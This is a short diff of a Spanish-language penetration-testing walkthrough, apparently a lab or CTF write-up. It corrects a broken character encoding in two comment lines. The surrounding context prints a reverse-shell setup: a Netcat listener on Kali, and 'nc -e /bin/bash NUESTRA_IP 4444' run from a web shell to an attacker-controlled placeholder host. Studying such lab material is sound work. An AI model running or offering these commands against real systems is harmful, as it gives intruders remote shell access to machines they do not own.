@@ -267,11 +267,11 @@ python -V # â†’ Python 2.x o 3.x confirmado
 
 Con Netcat y Python disponibles, se puede lanzar una reverse shell estabilizada:
 
-# En Kali â€” poner Netcat a escuchar
+# En Kali — poner Netcat a escuchar
 
 nc -lvnp 4444
 
-# En la shell web â€” lanzar la reverse shell
+# En la shell web — lanzar la reverse shell
 
 nc -e /bin/bash NUESTRA_IP 4444
 
